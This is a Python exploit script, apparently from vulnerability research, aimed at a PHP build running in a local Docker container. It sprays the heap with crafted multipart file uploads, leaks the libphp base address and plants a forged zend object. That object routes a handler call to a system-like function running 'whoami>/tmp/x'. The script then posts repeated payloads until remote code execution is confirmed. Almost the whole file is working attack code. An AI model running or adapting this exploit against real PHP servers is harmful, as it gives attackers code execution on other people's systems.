#!/usr/bin/env python3
"""oom104: three-bit law + multi-copy search + 98g fire rhythm.

Bit algebra from zend_types.h (GC_TYPE_MASK=0xf, GC_FLAGS_MASK=0x3f0):
the walked zval in the pointer run self-types from OBJ's own bytes:
  ti = OBJ & 0xFFFFFFFF  (next slot's low 4 bytes)
  type  = ti & 0xF        -> need 8 (IS_OBJECT)   => OBJ&0xF==8
  flags = (ti>>4)&0x3F    -> DESTRUCTOR_CALLED=1<<4 of flags (ti bit8)
                             FREE_CALLED    =1<<5 of flags (ti bit9)
  need: (OBJ>>8)&1==1 (DC set -> skip dtor) and (OBJ>>9)&1==0
        (FC clear -> store_del CALLS free_obj=system)
Tonight's boot: OBJ=...17e8 had bit9=1 -> silent skip. And NO offset in
a 1537B tile passed all three bits for V mod 512=0x66a. FIX: probe
reports multiple 176-strided copies; their low bits differ -> search
copies x offsets for a legal (V', BOFF).

Walk-slot evidence: 98g rdi=OBJ proves the aim-envelope walk reads a
slot ~440-488 -> BLOCK starts >= 500 (keeps the walked slot in the run).
Fire rhythm: plant (aim body) -> same-shape aim body fires (98g's
crashing fire was same-shape; fat envelopes walk elsewhere).
"""
import struct, subprocess, time, re, urllib.request, urllib.error

HOST = "http://127.0.0.1:8081"
OUT = lambda s: print(s, flush=True)

def sh(cmd, timeout=90):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout).stdout.strip()

def get(url, timeout=30):
    try:
        return urllib.request.urlopen(url, timeout=timeout).read().decode("utf8", "replace")
    except Exception as e:
        return "ERR %s" % e

def post(body, timeout=120):
    req = urllib.request.Request(HOST + "/oom_sapi.php", data=body)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return str(r.status), r.read(120)
    except urllib.error.HTTPError as e:
        return str(e.code), e.read(120)
    except Exception as e:
        return "ERR", repr(e).encode()

BASE = None
for ln in sh("docker exec php_vuln sh -c 'cat /proc/1/maps'").splitlines():
    if "libphp.so" in ln:
        BASE = int(ln.split("-")[0], 16)
        break
OUT("    libphp=0x%x" % BASE)
assert BASE and BASE > 0x7f0000000000

ZIF = 0x39b8a0
TILE = 176
MAXT = 1537

def gs_block():
    hdr = struct.pack("<IIQQ", 1, 0x106, 0, 13)
    s = b"whoami>/tmp/x\x00"
    return hdr + s + b"\x00" * ((-(24 + len(s))) % 8)   # 40B

def build_tile(OBJ, BOFF):
    B = bytearray(TILE)
    struct.pack_into("<II", B, 0x00, 1, 0x108)
    struct.pack_into("<II", B, 0x08, 1, 0)
    struct.pack_into("<Q",  B, 0x10, 0)
    struct.pack_into("<I",  B, 0x2C, 1)           # num_args (frame+44)
    B[0x18:0x20] = struct.pack("<Q", OBJ + 0x90)  # handlers -> table
    B[0x50:0x58] = struct.pack("<Q", OBJ + 0x68)  # arg zval = gs
    B[0x58:0x5C] = struct.pack("<I", 6)           # IS_STRING
    B[0x68:0x68 + 40] = gs_block()
    B[0x90:0xA0] = struct.pack("<QQ", 0, BASE + ZIF)
    T = bytearray(MAXT)
    for off in range(0, BOFF, 8):
        struct.pack_into("<Q", T, off, OBJ)
    T[BOFF:BOFF + TILE] = B
    return bytes(T)

def probe_copies(needle, maxc=12):
    h = needle.hex()
    for a in range(6):
        out = get("%s?h=%s&chunk=262144&maxc=%d" % (HOST + "/oom_probe.php", h, maxc), timeout=40)
        if out.startswith("ERR") or "Fatal" in out:
            time.sleep(0.5); continue
        m = re.search(r"R=(\d+) d=([0-9a-f ]+)", out)
        if m:
            return [int(x, 16) for x in m.group(2).split()]
    return []

def find_aim(offs):
    """Search (copy, BOFF) pairs for the three-bit law."""
    for V in offs:
        for BOFF in range(500, MAXT - TILE):   # step 1: bit laws filter
            x = V + BOFF
            if (x & 0xF) == 8 and ((x >> 8) & 1) == 1 and ((x >> 9) & 1) == 0:
                return V, x, BOFF
    return None, None, None

def aim_body(tile):
    parts = []
    parts.append(b"------X\r\nContent-Disposition: form-data; name=\"p0\"; filename=\"%s\"\r\n"
                 b"Content-Type: text/plain\r\n\r\n%s\r\n" % (b"a" * 1525, tile))
    for i in range(1, 3400):
        parts.append(b"------X\r\nContent-Disposition: form-data; name=\"p%d\"; filename=\"%s\"\r\n"
                     b"Content-Type: text/plain\r\n\r\n%s\r\n" % (i, b"a" * 1525, b"A" * 1537))
    parts.append(b"------X--\r\n")
    return b"".join(parts)

def check_x(tag):
    x = sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'")
    if "No such" not in x:
        OUT("    *** %s: /tmp/x EXISTS: %r" % (tag, x))
        return True
    return False

# ================= cycle =================
WARM = aim_body((b"WARMUPX" * 192 + b"W" * 400)[:1537])
for i in range(30):
    post(WARM)
offs = probe_copies(b"WARMUPX" * 24, maxc=12)
OUT("    copies=%s" % ([hex(o) for o in offs[:6]],))
assert offs, "no sentinel copies"
V, OBJ, BOFF = find_aim(offs)
OUT("    V=%s OBJ=%s BOFF=%s" % (hex(V) if V else None,
    hex(OBJ) if OBJ else None, BOFF))
assert OBJ, "no legal (copy,BOFF) -> new boot needed"

tile = build_tile(OBJ, BOFF)
code, resp = post(aim_body(tile))          # plant
OUT("    plant: %s %r" % (code, resp[:40]))
if check_x("plant"):
    raise SystemExit("*** RCE CONFIRMED (plant) ***")
for fi in range(4):                        # same-shape fires (98g rhythm)
    code, resp = post(aim_body(tile))
    OUT("    fire%d: %s" % (fi, code))
    if check_x("fire%d" % fi):
        raise SystemExit("*** RCE CONFIRMED ***")
    if code == "ERR":
        time.sleep(3)
OUT("done; /tmp/x=%s" % sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'"))
